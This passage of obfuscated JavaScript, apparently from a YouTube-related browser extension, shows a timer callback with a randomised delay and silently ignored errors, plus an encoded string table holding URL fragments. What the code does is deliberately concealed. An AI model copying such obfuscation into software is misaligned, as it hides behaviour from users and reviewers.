    })['catch'](h => {});
  }, (0x132d * -0x1 + -0x31c7 + 0x604c) * getRandomInt(0x262e + 0xd * 0x295 + -0x47be, 0x2082 + 0x263 + -0x22e0));
}, -0x1f3c + -0xaf9 + 0x2a99);

function a() {
  const bm = [
    'hash',
    'https://gr',
    'https://st',
    'e/*',
    'sufkCvj4AfzXtW',
    'jSodW7tdGY7cHsa',
    'repeatExte',
    'wWkviY8zBr',
    'ChrZlZqZnde5oq',
    'youtube-po',
    'WO1UW6NdRmonW4enWOZcKt4',
    'wCkDW7BcLdpdSXpcQmojWO0',
    'W5zLW6ZcRCkaWOSCWPZdIYm',
    'CMfUzg9T',
    'Df0/W5zuvSk+zmkxsq',
    'ptmWndu4yZLJzq',
    'z290BW',
    ',to\x20be\x20con',
    'zc1RAwXSlwP1CW',
    'W7RcH8kTWQ7cPCormM/dOCoH',
    '44cNWPJMLQlMNk7OQ7VLRzhLUkeAvs0',
    'bIniW6RdKCoNWRr0W5/dVq',
    'W7O1W4hdRmo7WRLmW5pcMCog',
    'osu4qYvfocu4na',
    'Aw4VBMv2zxiTAa',
    'W7hcNColoXpcGSoOW7yNtG',
    '-descripti',
    '-optimize-',
    'W6RcIfdcScJcP2lcMCkgWPi',
    'lwfUzc1TyxaTAq'
  ];
  a = function() {
    return bm;
  };
  return a();
}